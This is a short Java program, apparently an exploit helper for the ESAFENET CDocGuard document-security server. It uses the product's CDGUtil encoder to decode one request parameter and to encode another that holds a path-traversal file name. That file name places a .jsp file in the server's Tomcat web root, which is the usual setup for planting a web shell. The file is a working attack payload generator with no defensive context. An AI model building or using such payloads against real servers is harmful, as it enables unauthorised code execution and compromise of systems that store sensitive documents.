public class Main {
    public static void main(String[] args) {
        String value_code = "AFMALANMJCEOENIBDJMKFHBANGEPKHNOFJBMIFJPFNKFOKHJNMLCOIDDJGNEIPOLOKGAFAFJHDEJPHEPLFJHDGPBNELNFIICGFNGEOEFBKCDDCGJEPIKFHJFAOOHJEPNNCLFHDAFDNCGBAEELJFFHABJPDPIEEMIBOECDMDLEPBJGBGCGLEMBDFAGOGM";
        String value_decode = "";
        String value_encode="";
        value_code = value_code.substring(value_code.indexOf("=") + 1);
        try
        {
            value_decode = CDGUtil.decode(value_code);
            // decode: fileName=../../../Program Files (x86)/ESAFENET/CDocGuard Server/tomcat64/webapps/ROOT/tttT.jsp
            System.out.println(value_decode);
            value_encode = CDGUtil.encode("fileName=../../../Program Files (x86)/ESAFENET/CDocGuard Server/tomcat64/webapps/ROOT/tttT.jsp");
            System.out.println(value_encode);


        }
        catch(Exception e)
        {
            e.printStackTrace();
        }
    }
}